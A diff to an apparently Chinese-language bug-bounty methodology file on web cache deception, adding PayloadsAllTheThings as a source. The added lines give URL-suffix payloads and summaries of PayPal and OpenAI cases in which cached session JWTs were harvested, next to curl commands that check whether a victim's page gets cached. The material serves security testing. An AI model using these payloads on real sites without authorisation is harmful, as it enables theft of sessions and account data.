@@ -6,7 +6,7 @@
 - [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（sources hackerone_public）
 - [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（sources portswigger_research + hackerone_public，report_count 16）
 - [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（sources github/hackerone_public/portswigger_research/omergil_research/youstin_research，report_count 10）
-- 权威公开源：PortSwigger Research（James Kettle "Practical Web Cache Poisoning"/"Web Cache Entanglement"、Omer Gil Web Cache Deception）——仅标注源文件已明确引用的研究
+- 权威公开源：PortSwigger Research（James Kettle "Practical Web Cache Poisoning"/"Web Cache Entanglement"、Omer Gil Web Cache Deception）——仅标注源文件已明确引用的研究；[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)（Web Cache Deception 章节）
 
 ---
 
@@ -139,6 +139,15 @@ curl -s -b "session=YOUR_SESSION" "https://target.com/account/profile.css"
 # 再不带认证从另一客户端取同一 URL —— 拿到受害者数据即命中
 curl -s "https://target.com/account/profile.css"
 ```
+
+**起手 URL 变体** `[PayloadsAllTheThings Web Cache Deception]`：
+
+```text
+https://example.com/app/conversation/.js?test
+https://example.com/app/conversation/;.js
+```
+
+**实战形态补充** `[PayloadsAllTheThings]`：PayPal 案例 = `/myaccount/home/malicious.css` 缓存账户页；OpenAI 案例 = 对 `/api/auth/session` 构造 `.css` 后缀路径 → 缓存的 JWT 被收割（**API 响应同样适用**，不只页面）。检测：对比带/不带后缀的响应内容与缓存头（`Age`/`X-Cache`），同 `§5` 缓存行为确认。
 
 ### 4.6 postMessage 源校验缺失 `[Claude-BugHunter]`
 
